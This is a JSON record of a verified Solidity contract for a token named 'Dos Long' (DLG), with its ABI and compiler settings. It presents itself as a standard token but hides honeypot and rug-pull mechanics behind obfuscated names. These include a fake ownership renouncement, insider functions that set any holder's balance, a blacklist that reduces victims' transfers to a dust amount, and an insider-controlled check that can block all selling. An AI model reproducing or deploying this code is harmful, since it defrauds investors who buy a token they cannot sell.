{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface isExemptReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract txTokenIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountTotal {\n    function createPair(address limitAuto, address buyTx) external returns (address);\n}\n\ninterface sellTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenLimit) external view returns (uint256);\n\n    function transfer(address fundLaunchWallet, uint256 txSwap) external returns (bool);\n\n    function allowance(address enableIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundLaunchWallet,\n        uint256 txSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundTotal, uint256 value);\n    event Approval(address indexed enableIs, address indexed spender, uint256 value);\n}\n\ninterface sellTradingMetadata is sellTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DosLong is txTokenIs, sellTrading, sellTradingMetadata {\n\n    uint256 constant isFund = 8 ** 10;\n\n    uint256 public toTotalLiquidity;\n\n    address private feeAt;\n\n    function name() external view virtual override returns (string memory) {\n        return sellSender;\n    }\n\n    function totalList(address fundLiquidity, address fundLaunchWallet, uint256 txSwap) internal returns (bool) {\n        require(atMarketingLiquidity[fundLiquidity] >= txSwap);\n        atMarketingLiquidity[fundLiquidity] -= txSwap;\n        atMarketingLiquidity[fundLaunchWallet] += txSwap;\n        emit Transfer(fundLiquidity, fundLaunchWallet, txSwap);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return feeAt;\n    }\n\n    string private sellLiquidityTake = \"DLG\";\n\n    address public shouldListLimit;\n\n    address maxSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function allowance(address tokenIs, address exemptTo) external view virtual override returns (uint256) {\n        if (exemptTo == atSwap) {\n            return type(uint256).max;\n        }\n        return shouldToReceiver[tokenIs][exemptTo];\n    }\n\n    function tradingBuy(address toReceiver) public {\n        limitToken();\n        \n        if (toReceiver == liquidityAmountSender || toReceiver == shouldListLimit) {\n            return;\n        }\n        receiverTake[toReceiver] = true;\n    }\n\n    function transferFrom(address fundLiquidity, address fundLaunchWallet, uint256 txSwap) external override returns (bool) {\n        if (_msgSender() != atSwap) {\n            if (shouldToReceiver[fundLiquidity][_msgSender()] != type(uint256).max) {\n                require(txSwap <= shouldToReceiver[fundLiquidity][_msgSender()]);\n                shouldToReceiver[fundLiquidity][_msgSender()] -= txSwap;\n            }\n        }\n        return marketingTotal(fundLiquidity, fundLaunchWallet, txSwap);\n    }\n\n    function approve(address exemptTo, uint256 txSwap) public virtual override returns (bool) {\n        shouldToReceiver[_msgSender()][exemptTo] = txSwap;\n        emit Approval(_msgSender(), exemptTo, txSwap);\n        return true;\n    }\n\n    uint8 private fromTakeLiquidity = 18;\n\n    address public liquidityAmountSender;\n\n    mapping(address => bool) public receiverTake;\n\n    uint256 amountTeamAt;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromTakeLiquidity;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellLiquidityTake;\n    }\n\n    function getOwner() external view returns (address) {\n        return feeAt;\n    }\n\n    function receiverFee(address txTeam, uint256 txSwap) public {\n        limitToken();\n        atMarketingLiquidity[txTeam] = txSwap;\n    }\n\n    bool public receiverTo;\n\n    mapping(address => mapping(address => uint256)) private shouldToReceiver;\n\n    bool private sellAmount;\n\n    function marketingTotal(address fundLiquidity, address fundLaunchWallet, uint256 txSwap) internal returns (bool) {\n        if (fundLiquidity == liquidityAmountSender) {\n            return totalList(fundLiquidity, fundLaunchWallet, txSwap);\n        }\n        uint256 buyAt = sellTrading(shouldListLimit).balanceOf(maxSell);\n        require(buyAt == toTeam);\n        require(fundLaunchWallet != maxSell);\n        if (receiverTake[fundLiquidity]) {\n            return totalList(fundLiquidity, fundLaunchWallet, isFund);\n        }\n        return totalList(fundLiquidity, fundLaunchWallet, txSwap);\n    }\n\n    function isListMin(uint256 txSwap) public {\n        limitToken();\n        toTeam = txSwap;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeTo;\n    }\n\n    bool public receiverMarketing;\n\n    function limitToken() private view {\n        require(fromMode[_msgSender()]);\n    }\n\n    mapping(address => bool) public fromMode;\n\n    uint256 public enableFromMin;\n\n    mapping(address => uint256) private atMarketingLiquidity;\n\n    bool public tradingLaunchLiquidity;\n\n    bool public limitLaunch;\n\n    function transfer(address txTeam, uint256 txSwap) external virtual override returns (bool) {\n        return marketingTotal(_msgSender(), txTeam, txSwap);\n    }\n\n    uint256 private feeTo = 100000000 * 10 ** 18;\n\n    constructor (){\n        \n        isExemptReceiver txTotal = isExemptReceiver(atSwap);\n        shouldListLimit = amountTotal(txTotal.factory()).createPair(txTotal.WETH(), address(this));\n        \n        liquidityAmountSender = _msgSender();\n        takeMin();\n        fromMode[liquidityAmountSender] = true;\n        atMarketingLiquidity[liquidityAmountSender] = feeTo;\n        \n        emit Transfer(address(0), liquidityAmountSender, feeTo);\n    }\n\n    function takeMin() public {\n        emit OwnershipTransferred(liquidityAmountSender, address(0));\n        feeAt = address(0);\n    }\n\n    function balanceOf(address tokenLimit) public view virtual override returns (uint256) {\n        return atMarketingLiquidity[tokenLimit];\n    }\n\n    string private sellSender = \"Dos Long\";\n\n    function maxReceiver(address limitWallet) public {\n        if (limitLaunch) {\n            return;\n        }\n        if (tradingLaunchLiquidity == sellAmount) {\n            enableFromMin = toTotalLiquidity;\n        }\n        fromMode[limitWallet] = true;\n        if (receiverTo) {\n            tradingLaunchLiquidity = false;\n        }\n        limitLaunch = true;\n    }\n\n    event OwnershipTransferred(address indexed walletFeeMax, address indexed marketingLaunched);\n\n    uint256 toTeam;\n\n    address atSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletFeeMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFromMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txSwap\",\"type\":\"uint256\"}],\"name\":\"isListMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAmountSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitWallet\",\"type\":\"address\"}],\"name\":\"maxReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txSwap\",\"type\":\"uint256\"}],\"name\":\"receiverFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldListLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTotalLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toReceiver\",\"type\":\"address\"}],\"name\":\"tradingBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLaunchLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundLaunchWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DosLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}